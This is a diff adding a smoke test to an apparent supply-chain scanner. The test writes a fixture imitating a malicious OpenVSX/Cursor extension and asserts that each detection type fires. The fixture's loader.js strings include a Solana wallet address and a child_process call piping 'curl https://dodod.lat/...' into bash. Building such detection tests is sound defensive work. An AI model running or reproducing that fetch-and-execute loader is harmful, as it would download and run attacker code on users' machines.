@@ -509,4 +509,44 @@ try {
   fs.rmSync(hadesRoot, { recursive: true, force: true });
 }
 
+const glassWasmRoot = makeFixture("scc-glasswasm-");
+try {
+  write(
+    path.join(glassWasmRoot, "package.json"),
+    JSON.stringify({
+      name: "openvsx-fixture",
+      version: "1.0.0",
+      devDependencies: {
+        "fixture-extension": "file:./noellee-doc.flint-debug-0.1.1.vsix"
+      },
+      notes: "vscode/noellee-doc/flint-debug@0.1.1"
+    }, null, 2)
+  );
+  write(path.join(glassWasmRoot, "noellee-doc.flint-debug-0.1.1.vsix"), "placeholder");
+  write(path.join(glassWasmRoot, ".cursor", "extensions", "noellee-doc.flint-debug-0.1.1", "snqpkebiwrxmoivl.wasm"), "placeholder");
+  write(
+    path.join(glassWasmRoot, ".cursor", "extensions", "noellee-doc.flint-debug-0.1.1", "loader.js"),
+    [
+      "require('./wasm_exec.js');",
+      "WebAssembly.instantiate(bytes, go.importObject);",
+      "fetch('https://api.mainnet.solana.com', { method: 'POST' });",
+      "const wallet = '6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz';",
+      "const cp = require('child_process');",
+      "cp.execSync('curl -fsSL https://dodod.lat/linux/i/_ | bash', { windowsHide: true });"
+    ].join("\n")
+  );
+
+  const report = scanTarget(glassWasmRoot);
+  assert.strictEqual(report.risk, "likely-exposed");
+  const types = new Set(report.findings.map((finding) => finding.type));
+  assert(types.has("glasswasm-openvsx-package-reference"));
+  assert(types.has("glasswasm-openvsx-vsix-file"));
+  assert(types.has("glasswasm-openvsx-wasm-payload-file"));
+  assert(types.has("glasswasm-openvsx-extension-path"));
+  assert(types.has("glasswasm-openvsx-loader-shape"));
+  assert(types.has("glasswasm-openvsx-indicator"));
+} finally {
+  fs.rmSync(glassWasmRoot, { recursive: true, force: true });
+}
+
 console.log("smoke tests passed");
